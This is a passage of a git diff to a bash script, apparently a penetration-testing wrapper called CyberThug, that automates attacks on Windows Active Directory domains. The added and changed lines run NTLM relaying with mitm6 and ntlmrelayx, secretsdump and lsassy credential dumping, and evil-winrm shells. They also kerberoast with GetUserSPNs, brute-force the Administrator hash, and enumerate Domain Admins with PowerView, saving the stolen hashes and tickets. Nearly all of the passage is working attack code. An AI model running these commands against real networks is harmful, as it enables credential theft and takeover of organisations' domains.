                echo -e "\033[35m[!] Enter a Valid Option\033[0m"
            fi
       done
+    elif [[ "$tool" = "11" ]]; then
+      while true; do
+           history -a "$HISTFILE"
+           echo  -e "\033[35m
+  __  _           _ ____       _                  _   _                           
+ / _|(_)_ __   __| |  _ \  ___| | ___  __ _  __ _| |_(_) ___  _ __    _ __  _   _ 
+| |_ | |  _ \ / _  | | | |/ _ \ |/ _ \/ _  |/ _  | __| |/ _ \|  _ \  |  _ \| | | |
+|  _|| | | | | | |_| | |_| |__/ |  __/ (_| | (_| | |_| | (_) | | | |_| |_) | |_| |
+|_|  |_|_| |_|\__,_|____/ \___|_|\___|\___ |\__,_|\__|_|\___/|_| |_(_) .__/ \__  |
+                                      |___/                          |_|    |___/ 
+           \033[0m"
+           echo "
+               1) findDelegation.py Domain/User:Password -target-domain Domain
+               2) findDelegation.py Domain/User:Password -target-domain Domain -k
+               3) findDelegation.py Domain/User:Password -target-domain Domain -dc-host DC -k 
+           "
+           read_input number $'\033[35m# \033[0m'
+           if [[ "$number" == ".." ]]; then
+               history -a "$HISTFILE"
+               exec "$0" "$@"
+           elif [[ "$number" == "1" ]]; then
+               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
+               read_input User $'\033[35mEnter The User : \033[0m' 
+               read_input Password $'\033[35mEnter The Password : \033[0m' 
+               echo ""
+               echo -e "\033[36m[+]-- Running findDelegation.py $Domain/$User:$Password -target-domain $Domain --[+]\033[0m"
+               echo ""
+	       findDelegation.py $Domain/$User:$Password -target-domain $Domain
+               echo "" 
+   	   elif [[ "$number" == "2" ]]; then
+               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
+               read_input User $'\033[35mEnter The User : \033[0m' 
+               read_input Password $'\033[35mEnter The Password : \033[0m' 
+               echo ""
+               echo -e "\033[36m[+]-- Running findDelegation.py $Domain/$User:$Password -target-domain $Domain -k --[+]\033[0m"
+               echo ""
+               findDelegation.py $Domain/$User:$Password -target-domain $Domain -k
+               echo ""
+           elif [[ "$number" == "3" ]]; then
+               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
+               read_input DC $'\033[35mEnter The DC : \033[0m' 
+               read_input User $'\033[35mEnter The User : \033[0m' 
+               read_input Password $'\033[35mEnter The Password : \033[0m' 
+               echo ""
+               echo -e "\033[36m[+]-- Running findDelegation.py $Domain/$User:$Password -target-domain $Domain -dc-host $DC -k --[+]\033[0m"
+               echo ""
+               findDelegation.py $Domain/$User:$Password -target-domain $Domain -dc-host $DC -k 
+               echo ""  
+           elif [[ "$number" == "exit" ]]; then
+               exit 0
+           else
+               echo ""
+               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
+           fi
+      done    
     elif [[ "$tool" == "exit" ]]; then
          exit 0
     elif [[ -z "$tool" ]]; then
@@ -5842,6 +6737,7 @@ if [[ "$flag_7" = true ]]; then
     mkdir -p $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN
     read_input User $'\033[35mEnter The User : \033[0m' 
     read_input Password $'\033[35mEnter The Password : \033[0m' 
+    read_input DC $'\033[35mEnter The DC : \033[0m' 
     history -a "$HISTFILE"
     sudo ntpdate -s $DC 
     Ip=$(ping -c 1 $DOMAIN | awk -F'[()]' '/PING/{print $2}')
@@ -5939,7 +6835,7 @@ fi
 
 rand=\$((RANDOM))
 
-impacket-ntlmrelayx -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
+ntlmrelayx.py -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
 while IFS= read -r line; do
     echo \"\$line\"
 
@@ -5952,7 +6848,7 @@ while IFS= read -r line; do
         if [ -z \"\$ip_c\" ]; then
 	   echo \" ** Add \$c_computer to /etc/hosts \"	
 	else        
-           gnome-terminal -- bash -c \"impacket-secretsdump \$esc_computer/\$esc_user_name:\$P@\$ip_c ; exec bash\"
+           gnome-terminal -- bash -c \"secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c ; secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c > /tmp/secretsdump_--creds_'\"$DATE\"'_\$esc_computer ; cp /tmp/secretsdump_--creds_'\"$DATE\"'_\$esc_computer $HOME/CyberThug_output/cyberthug_--creds_output/'\"$DOMAIN\"' ; exec bash\"
         fi
     fi
 done
@@ -6010,7 +6906,7 @@ if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
     expect << EOD
       log_user 1
       sleep 8
-      spawn impacket-ntlmrelayx -tf /tmp/targets_creds.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
+      spawn ntlmrelayx.py -tf /tmp/targets_creds.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
       set targets {}
       expect {
          eof { exit }
@@ -6025,12 +6921,12 @@ if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
             set Username \$expect_out(2,string)
             if {[lsearch \$targets \$Username] == -1} {
                 lappend targets \$Username 
-                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q impacket-smbexec -no-pass \$Username@$target -debug ; exec bash"
-                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-secretsdump -no-pass \$Username@$target -debug ; exec bash" 
-		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q impacket-smbclient -no-pass \$Username@$target ; exec bash"
+                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q smbexec.py -no-pass \$Username@$target -debug ; exec bash"
+                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q secretsdump.py -no-pass \$Username@$target -debug ; proxychains -q secretsdump.py -no-pass \$Username@$target > /tmp/secretsdump_--creds_$DOMAIN ; cp /tmp/secretsdump_--creds_$DOMAIN $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/secretsdump_--creds_$DATE ; exec bash" 
+		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q smbclient.py -no-pass \$Username@$target ; exec bash"
             }    
             exp_continue
-           }
+           } 
          }
 EOD
 else
@@ -6274,6 +7170,96 @@ echo -e "\e[1;35m
 | |\  |/  \ |___  
 |_| \_/_/\_\____|
 	\e[0m"
+
+gnome-terminal -- bash -c "
+echo ''
+read -p \"Press Enter to run Evil-Winrm for User => $User\"
+echo ''   
+evil-winrm -i $DOMAIN -u $User -p $Password
+echo ''
+getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
+echo ''
+export KRB5CCNAME=$User.ccache
+echo ''
+evil-winrm -i $DC -u $User -r $CLEAN_DOMAIN
+exec bash"
+
+gnome-terminal -- bash -c "
+echo ''
+read -p \"Press Enter to run Powerview for User => $User\"
+echo '' 
+expect -c \"
+set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC 
+expect -re {PV.*❯};
+send -s \\\\\"Get-Domain\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -spn\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -PreAuthNotRequired\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup -Properties name,member\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup -AdminCount\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainTrust\\\\r\\\\\";
+interact\"
+echo ''
+getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $Ip -k
+echo ''
+export KRB5CCNAME=$User.ccache
+expect -c \"
+set timeout -1
+set send_slow {1 .001}
+spawn powerview $CLEAN_DOMAIN/$User:$Password@$DC -k
+expect -re {PV.*❯};
+send -s \\\\\"Get-Domain\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -spn\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -PreAuthNotRequired\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup -Properties name,member\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\"\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainGroup -AdminCount\\\\r\\\\\";
+expect -re {PV.*❯};
+send -s \\\\\"Get-DomainTrust\\\\r\\\\\";
+interact\"
+echo ''
+exec bash"
 echo ""
 echo -e "\033[36m[+]-- Running nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag --[+]\033[0m"
 nxc smb $DOMAIN -u $User -p $Password -M lsassy $flag 
@@ -6350,11 +7336,24 @@ echo ""
 echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag --[+]\033[0m"
 nxc ldap $DOMAIN -u $User -p $Password --gmsa $flag
 echo ""
+echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag --[+]\033[0m"
+nxc ldap $DOMAIN -u $User -p $Password --trusted-for-delegation $flag
+echo ""
+echo -e "\033[36m[+]-- Running nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag --[+]\033[0m"
+nxc ldap $DOMAIN -u $User -p $Password -M ldap-checker $flag 
+echo ""
 echo -e "\033[36m[+]-- Running nxc mssql $DOMAIN --local-auth -u $User -p $Password -x '\''net user'\'' $flag --[+]\033[0m"
 nxc mssql $DOMAIN --local-auth -u $User -p $Password -x "net user" $flag
 echo ""
 exec bash
 '
+echo""
+gnome-terminal -- bash -c "
+echo -e '\033[36m[+]-- BruteForcing Administrator Hash --[+]\033[0m'
+echo ""
+nxc smb $DOMAIN -u Administrator -H /usr/share/wordlists/hashes
+exec bash
+"
 echo ""
 echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --continue-on-success $flag --[+]\033[0m"
 echo ""
@@ -6388,8 +7387,8 @@ for i in {1..15}; do
     sleep 0.1
 done
 echo ""
-nxc smb $DOMAIN -u $User -p $Password --shares $flag | awk '/READ/ {print \$5}' > /tmp/shares.txt
-if [[ -s /tmp/shares.txt ]]; then
+nxc smb $DOMAIN -u $User -p $Password --shares $flag | awk 'NR>6 && \$0 ~ /READ/ {for(i=5;i<=NF && \$i !~ /READ/; i++) printf "%s%s",\$i,(i<NF?" ":"\n"); print ""}' > /tmp/shares.txt
+if [[ -s /tmp/shares.txt ]]; then 
    if [[ -f "$User" || -f "$Password" ]]; then
         :
    else
@@ -6403,14 +7402,14 @@ if [[ -s /tmp/shares.txt ]]; then
                                echo -e '\033[36m[+] User: $User\033[0m'
                                echo -e '\033[36m[+] Password: $Password\033[0m'
                                echo \"\"
-                               smbclient //$DC/\\\$share -U $User%$Password
+                               smbclient //$DC/'\\\$share' -U $User%$Password
                                echo \"\"
                                echo -e '\033[36m[+] Getting TGT for => $User\033[0m'
                                echo \"\"
                                getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 
                                export KRB5CCNAME=${User}.ccache
                                echo \"\"
-                               impacket-smbclient -k -no-pass -target-ip $Ip $CLEAN_DOMAIN/$User@$DC
+                               smbclient.py -k -no-pass -target-ip $Ip $CLEAN_DOMAIN/$User@$DC
                                exec bash
              \"
            done < /tmp/shares.txt
@@ -6418,6 +7417,10 @@ if [[ -s /tmp/shares.txt ]]; then
       "
    fi
 fi
+echo ""
+echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" -M spider_plus $flag --[+]\033[0m"
+echo ""
+nxc smb $DOMAIN -u $User -p $Password -M spider_plus $flag  
 echo ""
 echo -e "\033[36m[+]-- Running nxc smb \"$DOMAIN\" -u \"$User\" -p \"$Password\" --loggedon-users $flag --[+]\033[0m"
 echo ""
@@ -6484,6 +7487,20 @@ echo ""
 echo -e "\033[36m[+]-- Running nxc ldap \"$DOMAIN\" -u \"$User\" -p \"$Password\" --bloodhound --collection all --dns-server $Ip $flag --[+]\033[0m"
 echo ""
 nxc ldap $DOMAIN -u $User -p $Password --bloodhound --collection all --dns-server $Ip $flag
+echo ""
+if [[ -f "$User" && -f "$Password" ]]; then
+     :
+elif [[ -f "$User" ]] ; then
+     :
+elif [[ -f "$Password" ]] ; then
+     :
+else
+     echo -e "\033[36m[+]-- Running findDelegation.py \"$DOMAIN\"/\"$User\":\"$Password\" -target-domain \"$DOMAIN\" $flag --[+]\033[0m"
+     findDelegation.py $DOMAIN/$User:$Password -target-domain $DOMAIN $flag
+     echo "----------"
+     echo -e "\033[36m[+]-- Running findDelegation.py \"$CLEAN_DOMAIN\"/\"$User\":\"$Password\" -target-domain \"$CLEAN_DOMAIN\" -dc-host \"$DC\" $flag --[+]\033[0m"
+     findDelegation.py $CLEAN_DOMAIN/$User:$Password -target-domain $CLEAN_DOMAIN -dc-host $DC $flag
+fi 
 echo ""
 if [[ -f "$User" && -f "$Password" ]]; then
     if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
@@ -6653,6 +7670,13 @@ else
          targeted_kerberoast_check
     fi            
 fi  
+echo -e "\033[36m[+]-- Running mssqlclient.py -windows-auth \"$CLEAN_DOMAIN\"/\"$User\":\"$Password\"@\"$Ip\" --[+]\033[0m"
+echo ""
+timeout 5 mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip > /tmp/mssql.txt
+if [[ \$(wc -l < /tmp/mssql.txt) -gt 5 ]]; then
+    gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Running mssqlclient.py on \"$CLEAN_DOMAIN\" --[+]\e[0m' ; echo '' ; mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip ; exec bash"
+fi  
+echo ""
 if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
     if [[ -f "$User" && -f "$Password" ]]; then
             echo "" 
@@ -6677,7 +7701,15 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
                 while read -r p; do
                     echo ""
                     echo -e "\033[36m\$u\033[0m" 
-                    GetUserSPNs.py "$CLEAN_DOMAIN/\$u:\$p" -request $dc_host $flag 2>/dev/null
+                    GetUserSPNs.py "$CLEAN_DOMAIN/\$u:\$p" -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
+                    if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
+                 	cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
+                 	echo "\$u" > /tmp/.current_iii.txt
+                 	getuserspns1_check
+                 	cat /tmp/.getuserspn-req2.txt.\$u
+                 	cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                 	rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
+                    fi
                 done < $Password
             done < /tmp/.test1_nxc_rid_brute
             echo ""
@@ -6717,7 +7749,15 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
             while read -r u; do
                 echo ""
                 echo -e "\033[36m\$u\033[0m" 
-                GetUserSPNs.py $CLEAN_DOMAIN/\$u:$Password -request $dc_host $flag 2>/dev/null
+                GetUserSPNs.py $CLEAN_DOMAIN/\$u:$Password -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
+                    if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
+                        cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
+                        echo "\$u" > /tmp/.current_iii.txt
+                        getuserspns1_check
+                        cat /tmp/.getuserspn-req2.txt.\$u
+                        cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                        rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
+                    fi
             done < /tmp/.test1_nxc_rid_brute
             echo ""
             echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
@@ -6756,7 +7796,15 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
                 while read -r p; do
                     echo ""
                     echo -e "\033[36m\$User\033[0m" 
-                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null
+                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
+                    if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
+                        cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
+                        echo "$User" > /tmp/.current_iii.txt
+                        getuserspns1_check
+                        cat /tmp/.getuserspn-req2.txt.$User
+                        cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                        rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
+                    fi
                 done < $Password
             echo ""
             echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
@@ -6794,7 +7842,15 @@ if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
             echo ""
             echo -e "\033[36m\$User\033[0m" 
-            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
+            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
+            if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
+                   cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
+                   echo "$User" > /tmp/.current_iii.txt
+                   getuserspns1_check
+                   cat /tmp/.getuserspn-req2.txt.$User
+                   cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                   rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
+            fi
             echo ""
             echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
             for i in \$(cat /tmp/.test1_nxc_rid_brute); do
@@ -6819,7 +7875,15 @@ else
             while read -r p; do
                 echo ""
                 echo -e "\033[36m\$u\033[0m" 
-                GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag 2>/dev/null
+                GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
+                if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
+                        cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
+                        echo "\$u" > /tmp/.current_iii.txt
+                        getuserspns1_check
+                        cat /tmp/.getuserspn-req2.txt.\$u
+                        cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                        rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
+                fi
             done < $Password
         done < $User
         echo ""
@@ -6873,6 +7937,21 @@ else
            getnpusers_check
         fi
         echo ""
+        echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
+        while read -r u; do
+            echo ""
+            echo -e "\033[36m\$u\033[0m" 
+            GetUserSPNs.py $CLEAN_DOMAIN/\$u:$Password -request $dc_host $flag | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
+            if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
+                 cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
+                 echo "\$u" > /tmp/.current_iii.txt
+	         getuserspns1_check
+                 cat /tmp/.getuserspn-req2.txt.\$u
+                 cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                 rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
+            fi
+        done < $User
+        echo "" 
         echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth \"$User\" -usersfile $User -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
         for i in \$(cat $User); do
             echo ""
@@ -6893,14 +7972,30 @@ else
                 while read -r p; do
                     echo ""
                     echo -e "\033[36m\$User\033[0m" 
-                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null
+                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
+                    if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
+                        cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
+                        echo "$User" > /tmp/.current_iii.txt
+                        getuserspns1_check
+                        cat /tmp/.getuserspn-req2.txt.$User
+                        cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                        rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
+                    fi
                 done < $Password
             echo ""
     else
             echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
             echo ""
             echo -e "\033[36m\$User\033[0m" 
-            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null
+            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
+            if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
+                cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
+                echo "$User" > /tmp/.current_iii.txt
+                getuserspns1_check
+                cat /tmp/.getuserspn-req2.txt.$User
+                cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
+                rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
+            fi
             echo ""
     fi
 fi
@@ -6910,20 +8005,29 @@ EOF
             targeted_kerberoast_check1
             getnpusers_check1
             getuserspns_check1 
+            getuserspns1_check1
             cat /tmp/auto1.sh /tmp/auto.sh > /tmp/auto2.sh
             cat /tmp/auto3.sh /tmp/auto2.sh > /tmp/auto4.sh  
             cat /tmp/auto5.sh /tmp/auto4.sh > /tmp/auto6.sh
-            mv /tmp/auto6.sh /tmp/auto.sh 
+            cat /tmp/auto7.sh /tmp/auto6.sh > /tmp/auto8.sh  
+            mv /tmp/auto8.sh /tmp/auto.sh 
 	    sed -i "s|__\\\$DC__|$DC|g" /tmp/auto.sh
 	    sed -i "s|__\\\$CLEAN_DOMAIN__|$CLEAN_DOMAIN|g" /tmp/auto.sh
 	    sed -i "s|__\\\$Ip__|$Ip|g" /tmp/auto.sh
             sed -i "s|__\\\$Kerberos__|$Kerberos|g" /tmp/auto.sh
             gnome-terminal -- bash -c "bash /tmp/auto.sh ; exec bash"
 fi 
-mkdir -p $HOME/CyberThug_output/tickets
-cp $HOME/*.ccache $HOME/CyberThug_output/tickets 2>/dev/null
-cp $HOME/Downloads/*.ccache $HOME/CyberThug_output/tickets 2>/dev/null
-cp *.ccache $HOME/CyberThug_output/tickets 2>/dev/null
+DATE=$(date +%Y-%m-%d_%H-%M)
+for file in $HOME/*.ccache; do
+  cp "$file" "$HOME/CyberThug_output/tickets/$(basename "$file" .ccache)_$DATE.ccache" 2>/dev/null
+done
+for file in $HOME/Downloads/*.ccache; do
+  cp "$file" "$HOME/CyberThug_output/tickets/$(basename "$file" .ccache)_$DATE.ccache" 2>/dev/null
+done
+for file in ./*.ccache; do
+  cp "$file" "$HOME/CyberThug_output/tickets/$(basename "$file" .ccache)_$DATE.ccache" 2>/dev/null
+done
+
 main
 echo ""
 rm $HOME/Downloads/tools/Files/*.state 2>/dev/null ; rm -r $HOME/Downloads/tools/Files/reports 2>/dev/null 
@@ -6961,6 +8065,4 @@ echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"
 #           fi
 #      done
 #--------------------------------------
-#    elif [[ "$tool" == "exit" ]]; then
-                                                                           
-                                                                               
+#    elif [[ "$tool" == "exit" ]]; then                                      
